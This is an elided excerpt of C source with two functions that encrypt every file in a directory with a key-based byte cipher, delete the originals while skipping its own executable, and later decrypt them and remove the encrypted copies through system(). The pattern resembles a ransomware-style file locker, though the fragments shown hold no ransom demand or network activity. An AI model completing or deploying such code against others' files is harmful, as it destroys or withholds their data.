...
* 1. Creates a files with the same name but with the extended extension: '.encrypted', 
*	skipping the files with that extension already (to avoid multiple encryptions). 
* 2. Reads from the file bytewise and adds a computed byte based on the 'key' to the new '.encrypted' file.
* 3. Removes the original file leaving only the '.encrypted' file. 
*/
void krypt_all_files_in(const char* exe_name, const char* dir, const char* key)
{
	FILE *pr, *fp_r, *fp_w;
	long int sz;
	size_t sz_k;
	...
	while ( fgets(filename, sizeof(filename) - 1, pr) != NULL ){
		...
		if ( strstr(filename, "..") != NULL || strcmp(filename, ".") == 0 
			|| strcmp(filename, exe_name) == 0 || strstr(filename, ".encrypted") != NULL
		...
		while ( (c = fgetc(fp_r)) != EOF ) {
			...
			fputc((c + riddler + prev_riddler[0] + prev_riddler[1]), fp_w);
			++i;
...
/*
* Lists all files under the directory 'dir' and does the following:
* 1. Looks after the extension '.encrypted' and if it has not got it the file is not of concern.
* 2. Creates a file without the '.encrypted' extension that will contain the original values. 
* 3. Reads from the '.encrypted' file bytewise and adds a computed byte based on the 'key' to the new file.
* 3. Removes the '.encrypted' file. 
*/
void dekrypt_all_files_in(const char* exe_name, const char* dir, const char* key)
{
	FILE *pr, *fp_r, *fp_w;
	long int sz;
	size_t sz_k;
	int pw, c, i, toggle;
	char cmd[200], filename[200], filepath[200], *ch, riddler, prev_riddler[2];
	...
	while ( fgets(filename, sizeof(filename) - 1, pr) != NULL ){
		...
		if ( ch != NULL ) {
			...
			*ch = '.';
			...
			system(cmd); // removing the '.encrypted' file
